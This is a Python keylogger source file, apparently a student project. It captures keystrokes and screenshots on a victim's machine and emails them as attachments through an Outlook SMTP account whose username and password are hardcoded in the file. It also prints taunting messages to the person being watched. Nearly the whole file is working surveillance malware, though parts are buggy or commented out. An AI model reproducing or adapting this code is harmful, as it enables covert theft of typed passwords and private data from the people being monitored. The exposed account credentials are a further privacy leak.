import getpass
import smtplib
import time
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from PIL import ImageGrab

print(
    "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
    "MINE. \nEnjoy using this computer while you still can!")

# send the information to an email
email = "csproject432@outlook.com"
password = "s1339490"
server = smtplib.SMTP('smtp.office365.com', 587)
server.starttls()
server.login(email, password)

# logger
full_log = ''
word = ''

# whenever we reach this character limit, it will send us the log of what the user has typed in
char_limit = 150

# The email where we will send what we collect
to_address = ' '

# How our keys will be stored
keys_info = "key_log.txt"
keys_info_e = "e_key_log.txt"

#How our screenshot will be stored
screenshot_info = "image.png"

file_path = " "
extend = "\\"

# Used for time
time_iteration = 15
number_of_iterations_end = 3

"""
def on_press(key):
    global word
    global full_log
    global email
    global char_limit
"""


def send_log(filename, attachment, to_address):
    from_address = email
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log file"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    server.starttls()
    server.login(from_address, password)
    text = msg.as_string()
    server.sendmail(from_address, to_address, text)
    print("Your logs are now sent. Thanks chump.")
    server.quit()
    # server.sendmail(email, email, full_log)


send_log(keys_info, file_path + extend + keys_info, to_address)

#Used for getting screenshots optional add-on for our keylogger
def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_info)

screenshot()


number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count
        print(key)
        keys.append(key)
        count += 1

        if (count >= 1):
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for i in keys:
                k = str(i).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if (current_time > stopping_time):
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if (current_time > stopping_time):
        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")
            send_log(screenshot_info, file_path + extend + screenshot_info, to_address)
            number_of_iterations += 1

            current_time = time.time()
            stopping_time = time.time() + time_iteration
"""
We need to rewrite the keystroke getter
    while len(full_log) < char_limit:
        if key == Key.space or key == Key.enter:
            word += ' '
            full_log += word
            word = ''
        if len(full_log) >= char_limit:
            send_log(keys_info, file_path + extend + keys_info, to_address)
            full_log = ''
            print("Your logs are now sent. Thanks chump.")
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f'{key}'
            char = char[1:-1]
            word += char

        if key == Key.esc:
            return False

    with Listener(on_press=on_press) as listener:
        listener.join("Your logs are now sent. Thanks chump.")
        """
